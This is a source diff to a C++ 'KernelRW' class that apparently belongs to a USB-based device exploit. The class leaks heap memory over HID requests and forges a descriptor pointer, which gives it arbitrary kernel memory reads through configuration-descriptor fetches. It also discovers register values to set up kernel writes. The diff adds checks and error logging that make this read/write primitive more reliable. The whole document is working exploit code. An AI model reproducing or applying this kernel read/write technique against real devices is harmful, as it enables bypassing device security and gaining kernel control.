@@ -20,7 +20,7 @@ bool KernelRW::setup_read() {
 
     const std::vector<uint8_t> sauth_marker = {0x1A, 0xCB, 0x0A, 0xFC, 0xBF, 0xFF, 0xFF, 0xFF};
 
-    std::vector<uint8_t> heap = usb->hid_get(0xF2, 0, 0x1000);
+    std::vector<uint8_t> heap = usb->hid_get(0xF2, 0x00, 0x1000);
 
     if (heap.size() < 0x800) return false;
 
@@ -35,8 +35,16 @@ bool KernelRW::setup_read() {
         return false;
     }
 
-    _sauth_off = found_off;
     forge_desc_off = found_off + constants::DESC_PTR_OFFSET;
+    
+    uint64_t current_descriptor = *reinterpret_cast<uint64_t*>(heap.data() + forge_desc_off);
+    
+    if (current_descriptor != constants::DESC_EXPECTED_VALUE) {
+        LOG_ERROR << "Real descriptor was not set! Expected: " << constants::DESC_EXPECTED_VALUE << " Got: " << current_descriptor << std::endl;
+        return false;
+    }
+
+    _sauth_off = found_off;
     cached_heap = heap;
 
     forge_desc_val = constants::u64(heap.data() + forge_desc_off);
@@ -64,7 +72,23 @@ std::vector<uint8_t> KernelRW::_read_raw(uint64_t addr, size_t length) {
 
     size_t HEAP_SEND_SIZE = forge_desc_off + 8;
     std::vector<uint8_t> payload(buf.begin(), buf.begin() + std::min(HEAP_SEND_SIZE, buf.size()));
-    if (usb->hid_set(0xFF, 0xFF, payload) == 0) return {};
+    if (usb->hid_set(0xF2, 0x00, payload) == 0) {
+        LOG_ERROR << "Failed to set forged descriptor address!" << std::endl;
+        return {};
+    }
+
+    std::vector<uint8_t> heap = usb->hid_get(0xF2, 0x00, payload.size());
+    if (heap.size() == 0) {
+        LOG_ERROR << "Failed to get heap!" << std::endl;
+        return {};
+    }
+
+    uint64_t current_descriptor = *reinterpret_cast<uint64_t*>(heap.data() + forge_desc_off);
+
+    if (current_descriptor != base_forge) {
+        LOG_ERROR << "Forge descriptor was not set! Expected: " << base_forge << " Got: " << current_descriptor << std::endl;
+        return {};
+    }
 
     while (offset < length) {
         uint64_t target_addr = addr + offset;
@@ -73,7 +97,7 @@ std::vector<uint8_t> KernelRW::_read_raw(uint64_t addr, size_t length) {
         std::vector<uint8_t> addrVal(16, 0);
         std::memcpy(addrVal.data(), &target_addr, 8);
 
-        usb->vendor_set(0xff, 0xff, addrVal);
+        usb->vendor_set(0xFF, 0xFF, addrVal);
 
         std::vector<uint8_t> desc = usb->get_config_desc(266);
         if (desc.empty()) return {};
@@ -152,7 +176,6 @@ std::vector<uint8_t> KernelRW::read(uint64_t addr, size_t length) {
     size_t chunk_size = 0x1000;
 
     for (size_t i = 0; i < length; i += chunk_size) {
-        usb->check_keep_alive();
         size_t clen = std::min(chunk_size, length - i);
         
         bool success = false;
@@ -241,6 +264,12 @@ Registers KernelRW::discover_registers() {
 
 bool KernelRW::setup_write() {
     Registers regs = discover_registers();
+
+    if (regs.req < 0xffffffc000000000 || regs.mep < 0xffffffc000000000 || regs.x21 < 0xffffffc000000000) {
+        LOG_ERROR << "Discovered registers do not look like pointers!" << std::endl;
+        return false;
+    }
+
     repair_descriptor();
 
     if (regs.x21 != 0) {
